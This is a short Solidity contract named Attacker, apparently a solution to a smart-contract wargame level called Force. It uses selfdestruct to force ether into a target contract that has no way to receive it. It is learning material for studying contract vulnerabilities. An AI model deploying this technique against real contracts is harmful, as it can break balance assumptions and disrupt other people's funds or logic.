// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract Attacker {
    Force public force;

    constructor(address _contract) payable {
        force = Force(_contract);
    }

    function attack() public {
        selfdestruct(payable(address(force)));
    }
}